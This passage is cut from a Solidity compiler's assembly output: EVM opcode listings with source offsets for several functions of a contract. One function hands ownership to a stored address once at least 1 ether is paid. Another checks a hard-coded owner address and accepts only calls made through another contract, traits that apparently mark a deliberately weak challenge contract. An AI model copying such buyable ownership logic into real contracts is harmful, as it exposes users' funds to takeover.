											"begin": 911,
											"end": 924,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 944,
											"end": 951,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SLOAD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "AND"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ISZERO"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MUL"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SUB"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "AND"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DIV"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DIV"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MUL"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MLOAD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MSTORE"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP3"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MSTORE"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP3"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SLOAD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "AND"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ISZERO"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MUL"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SUB"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "AND"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DIV"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ISZERO"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPI"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "LT"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPI"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP4"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SLOAD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DIV"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MUL"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP4"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MSTORE"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "tag",
											"value": "183"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPDEST"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP3"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MSTORE"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "KECCAK256"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "tag",
											"value": "184"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPDEST"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SLOAD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "MSTORE"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP4"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "GT"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH [tag]",
											"value": "184"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPI"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP3"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SUB"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "AND"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "DUP3"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP2"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "tag",
											"value": "182"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "JUMPDEST"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 951,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "tag",
											"value": "104"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "JUMPDEST"
										},
										{
											"begin": 2883,
											"end": 2887,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2907,
											"end": 2916,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2917,
											"end": 2921,
											"name": "DUP4"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "AND"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "AND"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "DUP2"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "MSTORE"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "ADD"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "SWAP1"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "DUP2"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "MSTORE"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "ADD"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "KECCAK256"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "SWAP1"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "SLOAD"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "SWAP1"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "EXP"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "SWAP1"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "DIV"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 2907,
											"end": 2922,
											"name": "AND"
										},
										{
											"begin": 2900,
											"end": 2922,
											"name": "SWAP1"
										},
										{
											"begin": 2900,
											"end": 2922,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "108"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4614,
											"end": 4618,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "PUSH [tag]",
											"value": "187"
										},
										{
											"begin": 4640,
											"end": 4650,
											"name": "CALLER"
										},
										{
											"begin": 4652,
											"end": 4659,
											"name": "DUP5"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 4698,
											"end": 4713,
											"name": "DUP6"
										},
										{
											"begin": 4661,
											"end": 4672,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4673,
											"end": 4683,
											"name": "CALLER"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4661,
											"end": 4684,
											"name": "KECCAK256"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4685,
											"end": 4692,
											"name": "DUP10"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "DUP2"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "KECCAK256"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "SLOAD"
										},
										{
											"begin": 4661,
											"end": 4697,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 4661,
											"end": 4697,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "SWAP2"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "tag",
											"value": "188"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "JUMPDEST"
										},
										{
											"begin": 4631,
											"end": 4639,
											"name": "PUSH [tag]",
											"value": "148"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "tag",
											"value": "187"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "JUMPDEST"
										},
										{
											"begin": 4733,
											"end": 4737,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4726,
											"end": 4737,
											"name": "SWAP1"
										},
										{
											"begin": 4726,
											"end": 4737,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "tag",
											"value": "110"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "JUMPDEST"
										},
										{
											"begin": 2392,
											"end": 2399,
											"name": "PUSH",
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 2379,
											"end": 2388,
											"name": "CALLVALUE"
										},
										{
											"begin": 2379,
											"end": 2399,
											"name": "LT"
										},
										{
											"begin": 2379,
											"end": 2399,
											"name": "ISZERO"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "JUMPI"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "DUP1"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "REVERT"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "tag",
											"value": "190"
										},
										{
											"begin": 2371,
											"end": 2400,
											"name": "JUMPDEST"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "SWAP1"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "SLOAD"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "SWAP1"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "EXP"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "SWAP1"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "DIV"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2445,
											"end": 2459,
											"name": "AND"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "AND"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "DUP1"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "SWAP1"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "SLOAD"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "SWAP1"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "EXP"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "SWAP1"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "DIV"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2437,
											"end": 2443,
											"name": "AND"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "AND"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "MLOAD"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "MLOAD"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "DUP1"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "SWAP2"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "SUB"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "SWAP1"
										},
										{
											"begin": 2416,
											"end": 2460,
											"name": "LOG3"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "SWAP1"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "SLOAD"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "SWAP1"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "EXP"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "SWAP1"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "DIV"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2480,
											"end": 2494,
											"name": "AND"
										},
										{
											"begin": 2471,
											"end": 2477,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2471,
											"end": 2477,
											"name": "DUP1"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "EXP"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "DUP2"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "SLOAD"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "DUP2"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "MUL"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "NOT"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "AND"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "SWAP1"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "DUP4"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "AND"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "MUL"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "OR"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "SWAP1"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "SSTORE"
										},
										{
											"begin": 2471,
											"end": 2494,
											"name": "POP"
										},
										{
											"begin": 2325,
											"end": 2502,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "tag",
											"value": "112"
										},
										{
											"begin": 4123,
											"end": 4517,
											"name": "JUMPDEST"
										},
										{
											"begin": 4162,
											"end": 4174,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4205,
											"end": 4247,
											"name": "PUSH",
											"value": "220866B1A2219F40E72F5C628B65D54268CA3A9D"
										},
										{
											"begin": 4195,
											"end": 4247,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4195,
											"end": 4247,
											"name": "AND"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "DUP1"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "SWAP1"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "SLOAD"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "SWAP1"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "EXP"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "SWAP1"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "DIV"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4195,
											"end": 4201,
											"name": "AND"
										},
										{
											"begin": 4195,
											"end": 4247,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4195,
											"end": 4247,
											"name": "AND"
										},
										{
											"begin": 4195,
											"end": 4247,
											"name": "EQ"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "PUSH [tag]",
											"value": "192"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "JUMPI"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "DUP1"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "REVERT"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "tag",
											"value": "192"
										},
										{
											"begin": 4187,
											"end": 4248,
											"name": "JUMPDEST"
										},
										{
											"begin": 4280,
											"end": 4290,
											"name": "CALLER"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "AND"
										},
										{
											"begin": 4267,
											"end": 4276,
											"name": "ORIGIN"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "AND"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "EQ"
										},
										{
											"begin": 4267,
											"end": 4290,
											"name": "ISZERO"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "PUSH [tag]",
											"value": "193"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "JUMPI"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "DUP1"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "REVERT"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "tag",
											"value": "193"
										},
										{
											"begin": 4259,
											"end": 4291,
											"name": "JUMPDEST"
										},
										{
											"begin": 4331,
											"end": 4332,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4310,
											"end": 4315,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4316,
											"end": 4326,
											"name": "CALLER"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "AND"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "AND"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "DUP2"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "MSTORE"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "ADD"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "SWAP1"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "DUP2"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "MSTORE"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "ADD"
										},
										{
											"begin": 4310,
											"end": 4327,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4310,
